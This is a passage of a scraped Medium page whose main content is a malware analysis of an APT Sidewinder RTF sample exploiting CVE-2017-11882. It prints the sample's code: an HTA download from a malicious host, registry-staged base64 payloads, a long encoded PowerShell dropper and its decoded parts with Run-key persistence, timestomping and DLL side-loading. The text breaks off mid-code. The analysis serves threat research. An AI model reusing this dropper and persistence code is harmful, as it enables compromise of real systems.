(Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlan":{"planId":"P-59P80963JF186412JJZU3SMI","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"monthlyPlanWithTrial":{"planId":"P-66C21969LR178604GJPVKUKY","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlanWithTrial":{"planId":"P-6XW32684EX226940VKCT2MFA","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oldMonthlyPlanNoSetupFee":{"planId":"P-4N046520HR188054PCJC7LJI","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlanNoSetupFee":{"planId":"P-7A4913502Y5181304CJEJMXQ","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"sdkUrl":"https:\u002F\u002Fwww.paypal.com\u002Fsdk\u002Fjs"},"stripePublishableKey":"pk_live_7FReX44VnNIInZwrIIx6ghjl","log":{"json":true,"level":"info"},"imageUploadMaxSizeMb":25,"staffPicks":{"title":"Staff Picks","catalogId":"c7bc6e1ee00f"}},"session":{"xsrf":""}}</script><script>window.__APOLLO_STATE__ = {"ROOT_QUERY":{"__typename":"Query","viewer":null,"collectionByDomainOrSlug({\"domainOrSlug\":\"sebdraven.medium.com\"})":null,"postResult({\"id\":\"5bc1a7e7c84c\"})":{"__ref":"Post:5bc1a7e7c84c"}},"LinkedAccounts:11d98531eebe":{"__typename":"LinkedAccounts","mastodon":null,"id":"11d98531eebe"},"NewsletterV3:ea2e06315f70":{"__typename":"NewsletterV3","id":"ea2e06315f70","type":"NEWSLETTER_TYPE_AUTHOR","slug":"11d98531eebe","name":"11d98531eebe","collection":null,"user":{"__ref":"User:11d98531eebe"}},"User:11d98531eebe":{"__typename":"User","id":"11d98531eebe","name":"Sebdraven","username":"sebdraven","newsletterV3":{"__ref":"NewsletterV3:ea2e06315f70"},"linkedAccounts":{"__ref":"LinkedAccounts:11d98531eebe"},"isSuspended":false,"imageId":"1*ycwwStTvoVxriAE2No5ipQ.jpeg","customDomainState":{"__typename":"CustomDomainState","live":{"__typename":"CustomDomain","domain":"sebdraven.medium.com"}},"hasSubdomain":true,"verifications":{"__typename":"VerifiedInfo","isBookAuthor":false},"socialStats":{"__typename":"SocialStats","followerCount":541,"followingCount":10,"collectionFollowingCount":10},"bio":"Malwarist,Threat Huntist and pythonist \u002F core dev of #yeti\u002F member of @ProjectHoneynet \u002F co-organizer #BotConf \u002F researcher","membership":{"__ref":"Membership:053eb905-f962-4628-8989-2a2e6e40254f"},"allowNotes":true,"viewerEdge":{"__ref":"UserViewerEdge:userId:11d98531eebe-viewerId:lo_1b9321f22782"},"twitterScreenName":"Sebdraven"},"Membership:053eb905-f962-4628-8989-2a2e6e40254f":{"__typename":"Membership","tier":"MEMBER","id":"053eb905-f962-4628-8989-2a2e6e40254f"},"Paragraph:9376201130db_0":{"__typename":"Paragraph","id":"9376201130db_0","name":"b4a6","type":"H3","href":null,"layout":null,"metadata":null,"text":"APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_1":{"__typename":"Paragraph","id":"9376201130db_1","name":"73e7","type":"H3","href":null,"layout":null,"metadata":null,"text":"Spear phishing","hasDropCap":true,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_2":{"__typename":"Paragraph","id":"9376201130db_2","name":"a25c","type":"P","href":null,"layout":null,"metadata":null,"text":"I’ve started few days ago an analysis on a RTF following my recent researches.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_3":{"__typename":"Paragraph","id":"9376201130db_3","name":"4ce6","type":"P","href":null,"layout":null,"metadata":null,"text":"I found it this: 892859ea9d86fc441b24222148db52eb33cd106c2ac68eafbe83ab0064215488","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_4":{"__typename":"Paragraph","id":"9376201130db_4","name":"9ab8","type":"P","href":null,"layout":null,"metadata":null,"text":"I execute rtfobj on it and two ole embedded objects malforfed:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*clv0SwElLXu5uycgGlttAA.png":{"__typename":"ImageMetadata","id":"1*clv0SwElLXu5uycgGlttAA.png","originalHeight":247,"originalWidth":1322,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_5":{"__typename":"Paragraph","id":"9376201130db_5","name":"0e14","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*clv0SwElLXu5uycgGlttAA.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_6":{"__typename":"Paragraph","id":"9376201130db_6","name":"e410","type":"P","href":null,"layout":null,"metadata":null,"text":"But rtfobj extracts succeffully two raws objects:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*RoH4AT4fAqfiiy4hO3C8DA.png":{"__typename":"ImageMetadata","id":"1*RoH4AT4fAqfiiy4hO3C8DA.png","originalHeight":39,"originalWidth":766,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_7":{"__typename":"Paragraph","id":"9376201130db_7","name":"c18f","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*RoH4AT4fAqfiiy4hO3C8DA.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_8":{"__typename":"Paragraph","id":"9376201130db_8","name":"6ef7","type":"P","href":null,"layout":null,"metadata":null,"text":"The object 6A2A1 is very interesting:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*jg292b2dNzrsJddVxaqeuQ.png":{"__typename":"ImageMetadata","id":"1*jg292b2dNzrsJddVxaqeuQ.png","originalHeight":310,"originalWidth":733,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_9":{"__typename":"Paragraph","id":"9376201130db_9","name":"2e3d","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*jg292b2dNzrsJddVxaqeuQ.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_10":{"__typename":"Paragraph","id":"9376201130db_10","name":"bc36","type":"P","href":null,"layout":null,"metadata":null,"text":"and this one:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*irGqF14uiBKgitbGYHGjNg.png":{"__typename":"ImageMetadata","id":"1*irGqF14uiBKgitbGYHGjNg.png","originalHeight":150,"originalWidth":826,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_11":{"__typename":"Paragraph","id":"9376201130db_11","name":"1806","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*irGqF14uiBKgitbGYHGjNg.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_12":{"__typename":"Paragraph","id":"9376201130db_12","name":"2cc5","type":"P","href":null,"layout":null,"metadata":null,"text":"In fact, the ole object is a exploit of CVE-2017–11882.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_13":{"__typename":"Paragraph","id":"9376201130db_13","name":"c509","type":"P","href":null,"layout":null,"metadata":null,"text":"The implementation is a bit different than my last article, there is not an object MTF.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_14":{"__typename":"Paragraph","id":"9376201130db_14","name":"6fe4","type":"P","href":null,"layout":null,"metadata":null,"text":"The implementation has many matching with the public exploit: https:\u002F\u002Fgithub.com\u002F0x09AL\u002FCVE-2017-11882-metasploit","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":62,"end":113,"href":"https:\u002F\u002Fgithub.com\u002F0x09AL\u002FCVE-2017-11882-metasploit","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_15":{"__typename":"Paragraph","id":"9376201130db_15","name":"2bdb","type":"P","href":null,"layout":null,"metadata":null,"text":"The exploitation is the following:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_16":{"__typename":"Paragraph","id":"9376201130db_16","name":"5e00","type":"P","href":null,"layout":null,"metadata":null,"text":"an hta is downloaded here and lauched by msthll.dll.RunHMLApplication.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_17":{"__typename":"Paragraph","id":"9376201130db_17","name":"af13","type":"P","href":null,"layout":null,"metadata":null,"text":"caller.exe hxxp:\u002F\u002Fwww.google.com.d-dns.co\u002Fincludes\u002F686a0ea5\u002F-1\u002F1223\u002Fda897db0\u002Ffinal.hta","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":11,"end":86,"href":"http:\u002F\u002Fwww.google.com.d-dns.co\u002Fincludes\u002F686a0ea5\u002F-1\u002F1223\u002Fda897db0\u002Ffinal.hta","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_18":{"__typename":"Paragraph","id":"9376201130db_18","name":"9584","type":"P","href":null,"layout":null,"metadata":null,"text":"The hta is a mix of powershell, vbscript and javascript.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_19":{"__typename":"Paragraph","id":"9376201130db_19","name":"a5f5","type":"H3","href":null,"layout":null,"metadata":null,"text":"Installation of payload and Persistance","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_20":{"__typename":"Paragraph","id":"9376201130db_20","name":"654b","type":"P","href":null,"layout":null,"metadata":null,"text":"The installation of the payload made by vscript a line 151","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_21":{"__typename":"Paragraph","id":"9376201130db_21","name":"e570","type":"P","href":null,"layout":null,"metadata":null,"text":"objWSS.RegWrite “HK”&”CU\\Softwa”&”re\\Updater\\pa”&”rt3\", bnm, “REG_SZ”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_22":{"__typename":"Paragraph","id":"9376201130db_22","name":"d378","type":"P","href":null,"layout":null,"metadata":null,"text":"here","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_23":{"__typename":"Paragraph","id":"9376201130db_23","name":"c2d0","type":"P","href":null,"layout":null,"metadata":null,"text":"tst = getProfile(“0”) & “$c=”””&c&”””;$m=”””&m&”””;”& Base64Decode(objWSS.RegRead(“HKEY_CURRENT_USER\\Softwa”&”re\\Updater\\pa”&”rt3\")) & getProfile(“1”)\nobjWSS.run “powershell.exe -ExecutionPolicy Bypass -Command “”” & tst & “”””, 0, true","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_24":{"__typename":"Paragraph","id":"9376201130db_24","name":"55e3","type":"P","href":null,"layout":null,"metadata":null,"text":"and here:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_25":{"__typename":"Paragraph","id":"9376201130db_25","name":"4cc1","type":"P","href":null,"layout":null,"metadata":null,"text":"objWSS.RegWrite “HKCU\\Software\\Updater”, “”\n objWSS.RegWrite “HKCU\\Software\\Updater\\part1”, p1, “REG_SZ”\n objWSS.RegWrite “HKCU\\Software\\Updater\\part2”, p2, “REG_SZ”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_26":{"__typename":"Paragraph","id":"9376201130db_26","name":"b229","type":"P","href":null,"layout":null,"metadata":null,"text":"The registry is used like pivot.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_27":{"__typename":"Paragraph","id":"9376201130db_27","name":"1f87","type":"P","href":null,"layout":null,"metadata":null,"text":"p1, p2 and bnm are three blobs of base64 data.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_28":{"__typename":"Paragraph","id":"9376201130db_28","name":"94f8","type":"P","href":null,"layout":null,"metadata":null,"text":"bdm decoded is:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_29":{"__typename":"Paragraph","id":"9376201130db_29","name":"7ba3","type":"BQ","href":null,"layout":null,"metadata":null,"text":"iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(“””U2V0LUV4ZWN1dGlvblBvbGljeSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtU2NvcGUgQ3VycmVudFVzZXIgLUZvcmNlOw0KJEVycm9yQWN0aW9uUHJlZmVyZW5jZT0nU2lsZW50bHlDb250aW51ZSc7DQoNCiRwbmFtZTM2ID0gIjMiICsgIjYwVHIiICsgImF5Ig0KJGJpbkRpciA9IFtFbnZpcm9ubWVudF06OkdldEZvbGRlclBhdGgoW0VudW1dOjpUb09iamVjdChbU3lzdGVtLkVudmlyb25tZW50K1NwZWNpYWxGb2xkZXJdLCAzNSkpKyAiXCIgKyAiV2luc2V0XENvbmZpZyIgKyAiXCI7DQokYmluID0gIldpbnNldC5leGUiOw0KdHJ5ew0KJGNtZExpbmUgPSAoW2ludF0kYykudG9TdHJpbmcoIjAwMDAwMDAwIikrKFtpbnRdJG0pLnRvU3RyaW5nKCIwMDAwMDAwMCIpOw0KJGNtZExpbmUgPSAkYmluKyAiICIgKyRjbWRMaW5lOw0KfQ0KY2F0Y2h7DQokY21kTGluZSA9ICRiaW47DQp9DQokbGluZSA9IG5ldy1vYmplY3QgYnl0ZVtdIDY0Ow0KJGJ1ZjYgPVtCeXRlW11dICgsMHgyMyAqIDY0KTsNCiRjYnl0ZXMgPSBbc3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygkY21kTGluZSk7DQpbYXJyYXldOjpjb3B5KCRjYnl0ZXMsJGxpbmUsJGNieXRlcy5sZW5ndGgpOw0KDQokYmluUGF0aCA9ICRiaW5EaXIgKyAkYmluOw0KJGJpblBhdGhkbGwgPSAkYmluRGlyICsgImNtcGJrMzIuZGxsIjsNCiRkbXliaW5QYXRoID0gJGJpbkRpciArICJjbWRsMzIuZXhlIjsNCiRycGNkbGxwYXRoID0gJGJpbkRpciArICI1NzE0NkM5Ni5kbGwiOw0KJHJ1biA9ICdIS0NVOlNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1blwnOw0KJHN5c3RlbSA9ICdIS0NVOlNvZnR3YXJlXFVwZGF0ZXInOw0KJHJ1bkV4aXN0cyA9IEZhbHNlOw0KJHBuYW1lYXZyID0gImF2IiArICJnbiIgKyAidCI7DQokbXN2YnZtZGxscGF0aCA9ICRlbnY6V0lORElSICsgIlxzeXN0ZW0zMlxtc3Zidm02MC5kbGwiDQokY21kbDMycGF0aCA9ICRlbnY6V0lORElSICsgIlxzeXN0ZW0zMlxjbWRsMzIuZXhlIg0KDQokcTM2ID0gR2V0LVByb2Nlc3MgJHBuYW1lMzYgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7DQppZigkcTM2KXsNCglleGl0DQp9DQoNCmZ1bmN0aW9uIGRjKCRzKXsNCglzYWwgbiBOZXctT2JqZWN0Ow0KCSRkYXRhID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygiSDRzSUFBQUFBQUEiICsgJHMpOw0KCSRtcyA9IG4gU3lzdGVtLklPLk1lbW9yeVN0cmVhbTsNCgkkbXMuV3JpdGUoJGRhdGEsIDAsICRkYXRhLkxlbmd0aCk7DQoJJG1zLlNlZWsoMCwwKSB8IE91dC1OdWxsOw0KCXJldHVybiAobiBTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyKG4gU3lzdGVtLklPLkNvbXByZXNzaW9uLkdaaXBTdHJlYW0oJG1zLCBbU3lzdGVtLklPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV06OkRlY29tcHJlc3MpKSkuUmVhZFRvRW5kKCk7DQp9Ow0KDQpmdW5jdGlvbiB1cGR0KCR0LCAkYil7DQoJKGxzICR0KS5MYXN0V3JpdGVUaW1lID0gIChscyAkYikuTGFzdFdyaXRlVGltZQ0KCShscyAkdCkuQ3JlYXRpb25UaW1lID0gKGxzICRiKS5DcmVhdGlvblRpbWUNCgkobHMgJHQpLkxhc3RBY2Nlc3NUaW1lID0gKGxzICRiKS5MYXN0QWNjZXNzVGltZQ0KfQ0KDQpmdW5jdGlvbiB3YjY0KCRwYXRoLCAkYjY0KXsNCgkkYnl0ZXMgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCJUVnEiICsgJGI2NCk7DQoJTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtRm9yY2UgLVBhdGggJGJpbkRpciB8IE91dC1OdWxsOw0KCVtpby5maWxlXTo6V3JpdGVBbGxCeXRlcygkcGF0aCwkYnl0ZXMpIHwgT3V0LU51bGw7DQoJdXBkdCAtdCAkcGF0aCAtYiAkY21kbDMycGF0aA0KfQ0KDQpmdW5jdGlvbiBzYigkaCwgJG4gKSB7DQogICAgJGxlbiA9ICRuLmxlbmd0aDsNCiAgICAkbGltaXQgPSAkaC5sZW5ndGggLSAkbGVuOw0KICAgIEZvciggJGkgPSAwOyAgJGkgLWxlICRsaW1pdDsgICRpKysgKSB7DQogICAgICAgICRrID0gMDsNCiAgICAgICAgRm9yKCA7ICAkayAtbHQgJGxlbjsgICRrKysgKSB7DQogICAgICAgICAgICBpZiggJG5bJGtdIC1uZSAkaFskaSska10gKSB7YnJlYWt9Ow0KICAgICAgICB9DQogICAgICAgIGlmKCAkayAtZXEgJGxlbiApe3JldHVybiAkaX07DQogICAgfQ0KICAgIHJldHVybiAtMTsNCn0NCg0KaWYoKFRlc3QtUGF0aCAkZW52OldJTkRJUlxTeXNXT1c2NCkpew0KCSRtc3Zidm1kbGxwYXRoID0gJGVudjpXSU5ESVIgKyAiXFN5c1dPVzY0XG1zdmJ2bTYwLmRsbCINCgkkY21kbDMycGF0aCA9ICRlbnY6V0lORElSICsgIlxTeXNXT1c2NFxjbWRsMzIuZXhlIg0KfQ0KDQp0cnl7DQoJaWYoIShUZXN0LVBhdGggJGJpblBhdGgpKXsNCg0KCQkkYjY0ID0gZGMgLXMgKChHZXQtSXRlbVByb3BlcnR5IC1QYXRoICRzeXN0ZW0pLnBhcnQxKTsNCgkJJGJ5dGVzID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygiVFZxIiArICRiNjQpOw0KCQkkcm4gPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKChHZXQtUmFuZG9tIC1NYXhpbXVtIDk5OTkgLU1pbmltdW0gMTExMSkpWzAuLjFdOw0KCQlbYXJyYXldOjpjb3B5KCRybiwwLCRieXRlcywkYnl0ZXMubGVuZ3RoIC0gMiwyKTsNCgkJTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtRm9yY2UgLVBhdGggJGJpbkRpciB8IE91dC1OdWxsOw0KCQlbaW8uZmlsZV06OldyaXRlQWxsQnl0ZXMoJGJpblBhdGgsJGJ5dGVzKSB8IE91dC1OdWxsOw0KCQl1cGR0IC10ICRiaW5QYXRoIC1iICRjbWRsMzJwYXRoDQoNCgkJJGI2NGRsbCA9IGRjIC1zICgoR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkc3lzdGVtKS5wYXJ0Mik7DQogICAgICAgICRieXRlcyA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIlRWcSIgKyAkYjY0ZGxsKTsNCgkJW2FycmF5XTo6Y29weSgkbGluZSwwLCRieXRlcywoc2IgLWggJGJ5dGVzIC1uICRidWY2KSw2NCk7DQoJCU5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLUZvcmNlIC1QYXRoICRiaW5EaXIgfCBPdXQtTnVsbDsNCgkJW2lvLmZpbGVdOjpXcml0ZUFsbEJ5dGVzKCRiaW5QYXRoZGxsLCRieXRlcykgfCBPdXQtTnVsbDsNCgkJdXBkdCAtdCAkYmluUGF0aGRsbCAtYiAkY21kbDMycGF0aA0KCX0NCg0KCVJlbW92ZS1JdGVtIC1QYXRoICRzeXN0ZW0gfCBPdXQtTnVsbDsNCglSZW1vdmUtSXRlbSAkUFJPRklMRS5DdXJyZW50VXNlckFsbEhvc3RzIHwgT3V0LU51bGw7DQoJTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcnVuIC1OYW1lICJXaW5zb3VuZCIgLVByb3BlcnR5VHlwZSBTdHJpbmcgLVZhbHVlICRkbXliaW5QYXRoIHwgT3V0LU51bGw7DQoJDQoJQ29weS1JdGVtICAkbXN2YnZtZGxscGF0aCAkcnBjZGxscGF0aA0KCXVwZHQgLXQgJHJwY2RsbHBhdGggLWIgJG1zdmJ2bWRsbHBhdGgNCg0KCUNvcHktSXRlbSAkY21kbDMycGF0aCAkZG15YmluUGF0aA0KCXVwZHQgLXQgJGRteWJpblBhdGggLWIgJGNtZGwzMnBhdGgNCg0KCSRhdnIgPSBHZXQtUHJvY2VzcyAkcG5hbWVhdnIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCglpZiAoISRhdnIpIHsNCgkJJigkZG15YmluUGF0aCkgfCBPdXQtTnVsbDsNCgl9DQoJRXhpdA0KfQ0KY2F0Y2ggew0KCSRfLkV4Y2VwdGlvbi5NZXNzYWdlIHwgT3V0LU51bGw7DQp9\"””)))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_30":{"__typename":"Paragraph","id":"9376201130db_30","name":"3d63","type":"P","href":null,"layout":null,"metadata":null,"text":"There is a new base64 block decoded:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_31":{"__typename":"Paragraph","id":"9376201130db_31","name":"7386","type":"BQ","href":null,"layout":null,"metadata":null,"text":"Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force;\n$ErrorActionPreference=’SilentlyContinue’;","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_32":{"__typename":"Paragraph","id":"9376201130db_32","name":"818a","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$pname36 = “3” + “60Tr” + “ay”\n$binDir = [Environment]::GetFolderPath([Enum]::ToObject([System.Environment+SpecialFolder], 35))+ “\\” + “Winset\\Config” + “\\”;\n$bin = “Winset.exe”;\ntry{\n$cmdLine = ([int]$c).toString(“00000000”)+([int]$m).toString(“00000000”);\n$cmdLine = $bin+ “ “ +$cmdLine;\n}\ncatch{\n$cmdLine = $bin;\n}\n$line = new-object byte[] 64;\n$buf6 =[Byte[]] (,0x23 * 64);\n$cbytes = [system.Text.Encoding]::ASCII.GetBytes($cmdLine);\n[array]::copy($cbytes,$line,$cbytes.length);","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_33":{"__typename":"Paragraph","id":"9376201130db_33","name":"58ba","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$binPath = $binDir + $bin;\n$binPathdll = $binDir + “cmpbk32.dll”;\n$dmybinPath = $binDir + “cmdl32.exe”;\n$rpcdllpath = $binDir + “57146C96.dll”;\n$run = ‘HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\’;\n$system = ‘HKCU:Software\\Updater’;\n$runExists = False;\n$pnameavr = “av” + “gn” + “t”;\n$msvbvmdllpath = $env:WINDIR + “\\system32\\msvbvm60.dll”\n$cmdl32path = $env:WINDIR + “\\system32\\cmdl32.exe”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_34":{"__typename":"Paragraph","id":"9376201130db_34","name":"2203","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$q36 = Get-Process $pname36 -ErrorAction SilentlyContinue;\nif($q36){\n exit\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_35":{"__typename":"Paragraph","id":"9376201130db_35","name":"4b28","type":"BQ","href":null,"layout":null,"metadata":null,"text":"function dc($s){\n sal n New-Object;\n $data = [System.Convert]::FromBase64String(“H4sIAAAAAAA” + $s);\n $ms = n System.IO.MemoryStream;\n $ms.Write($data, 0, $data.Length);\n $ms.Seek(0,0) | Out-Null;\n return (n System.IO.StreamReader(n System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd();\n};","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_36":{"__typename":"Paragraph","id":"9376201130db_36","name":"f854","type":"BQ","href":null,"layout":null,"metadata":null,"text":"function updt($t, $b){\n (ls $t).LastWriteTime = (ls $b).LastWriteTime\n (ls $t).CreationTime = (ls $b).CreationTime\n (ls $t).LastAccessTime = (ls $b).LastAccessTime\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_37":{"__typename":"Paragraph","id":"9376201130db_37","name":"2c33","type":"BQ","href":null,"layout":null,"metadata":null,"text":"function wb64($path, $b64){\n $bytes = [System.Convert]::FromBase64String(“TVq” + $b64);\n New-Item -ItemType Directory -Force -Path $binDir | Out-Null;\n [io.file]::WriteAllBytes($path,$bytes) | Out-Null;\n updt -t $path -b $cmdl32path\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_38":{"__typename":"Paragraph","id":"9376201130db_38","name":"0563","type":"BQ","href":null,"layout":null,"metadata":null,"text":"function sb($h, $n ) {\n $len = $n.length;\n $limit = $h.length — $len;\n For( $i = 0; $i -le $limit; $i++ ) {\n $k = 0;\n For( ; $k -lt $len; $k++ ) {\n if( $n[$k] -ne $h[$i+$k] ) {break};\n }\n if( $k -eq $len ){return $i};\n }\n return -1;\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_39":{"__typename":"Paragraph","id":"9376201130db_39","name":"14bf","type":"BQ","href":null,"layout":null,"metadata":null,"text":"if((Test-Path $env:WINDIR\\SysWOW64)){\n $msvbvmdllpath = $env:WINDIR + “\\SysWOW64\\msvbvm60.dll”\n $cmdl32path = $env:WINDIR + “\\SysWOW64\\cmdl32.exe”\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_40":{"__typename":"Paragraph","id":"9376201130db_40","name":"d993","type":"BQ","href":null,"layout":null,"metadata":null,"text":"try{\n if(!(Test-Path $binPath)){","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_41":{"__typename":"Paragraph","id":"9376201130db_41","name":"b496","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$b64 = dc -s ((Get-ItemProperty -Path $system).part1);\n $bytes = [System.Convert]::FromBase64String(“TVq” + $b64);\n $rn = [System.BitConverter]::GetBytes((Get-Random -Maximum 9999 -Minimum 1111))[0..1];\n [array]::copy($rn,0,$bytes,$bytes.length — 2,2);\n New-Item -ItemType Directory -Force -Path $binDir | Out-Null;\n 